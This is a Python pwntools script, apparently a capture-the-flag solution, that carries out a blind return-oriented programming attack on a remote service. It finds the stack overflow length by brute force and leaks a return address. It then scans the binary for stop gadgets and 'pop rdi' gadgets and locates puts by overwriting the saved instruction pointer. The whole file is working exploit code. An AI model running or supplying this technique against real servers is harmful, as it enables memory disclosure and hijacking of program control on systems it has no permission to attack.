#!/usr/bin/env python3

from pwn import *
from utils import connect, disconnect, debugInfo
from Crypto.Util.number import bytes_to_long

timeout = 0.1


def getPadding(debug=False):
    log.info('finding overflow size')
    i = 0 # counter

    while True:
        # connect to server and wait for prompt
        r = connect()
        r.recv(timeout=timeout)

        # send the growing buffer
        i += 1
        pld = b'X' * i
        r.send(pld)

        # check output
        try:
            output = r.recv(timeout=timeout)
            disconnect(r)
            if output:
                debugInfo(f'{i} -> {output}', debug)
        except:
            log.warn(f'overflow when padding size = {i}')
            return i-1 # -1 because we want the padding size


def leakAddr(pad):
    c = b'X'
    pld = c * pad

    # connect to serv and send pld
    r = connect()
    r.recv(timeout=timeout)
    r.send(pld)

    # return addr leak
    leak = r.recv(timeout=timeout)
    addr = bytes_to_long(leak[leak.rfind(c) + 1:-5][::-1])
    return addr


def getStopGadgets(pad, base_addr, ref, debug=False):
    log.info(f'searching stop gadgets, base addr = {hex(base_addr)}')
    L = [] # found addresses
    start = 0x0
    end = start + 0x1500

    for i in range(start, end):
        r = connect()

        try:
            # build payload
            addr = base_addr + i
            pld = b'X' * pad    # fill buffer
            pld += p64(addr)    # rip
            debugInfo(f'searching stop gadgets, trying {hex(addr)}', debug)

            # send pld and check if ref is in output
            r.recv(timeout=timeout)
            r.send(pld)
            res = r.recv(timeout=timeout)
            if ref in res:
                L.append(addr) # this address is a stop gadget

        except: # we crashed, close socket and continue
            pass
        disconnect(r)

    return L # return found stop gadgets


def getBropGadgets(base_addr, ref, stop_gadgets, debug):
    stop_gadget = stop_gadgets[0]
    log.info(f'searching BROP gadgets, base addr = {hex(base_addr)}')
    start = 0
    end = start + 0x2000
    L = []

    # iterate over the whole ELF
    for i in range(start, end):
        r = connect()

        try:
            # build payload
            addr = base_addr + i
            pld = b'X' * 40            # fill buffer
            pld += p64(addr)           # overwrite `rip` with gadget
            pld += p64(0) * 6          # 6 addresses popped into registers
            pld += p64(stop_gadget)    # regain exec flow control with the `ret`
            debugInfo(f'searching brop gadgets, trying {hex(addr)}', debug)

            # send payload and receive response
            r.recv(timeout=timeout)
            r.send(pld)
            res = r.recv(timeout=timeout)
            if ref in res:
                # /!\ be careful with false positives /!\
                if addr not in stop_gadgets:
                    L.append(addr)

        except: # we crashed, close socket and continue
            pass
        disconnect(r)

    return L # return found BROP gadgets


def getPutsAddr(stop_gadget, pop_rdi, base_addr, debug):
    # iterate over the whole ELF
    start = 0x0
    end = start + 0x2000
    log.info(f'searching puts addr, base addr = {hex(base_addr)}')

    for i in range(start, end):
        r = connect()

        try:
            # build payload
            addr = base_addr + i
            pld = b'c' * 40           # fill buffer
            pld += p64(pop_rdi)       # load `pop rdi; ret` opcodes in `rdi`
            pld += p64(pop_rdi)       # puts arg = '\x5f\xc3'
            pld += p64(addr)          # puts addr
            pld += p64(stop_gadget)   # stop gadget

            # send payload and receive response
            debugInfo(f'searching puts addr, trying {hex(addr)}', debug)
            r.recv(timeout=timeout)
            r.send(pld)
            res = r.recv(timeout=timeout)
            if b'\x5f\xc3' in res:
                return addr

        except: # we crashed, close socket and continue
            pass
        disconnect(r)

    # fail, the BROP gadget is not correct
    return None
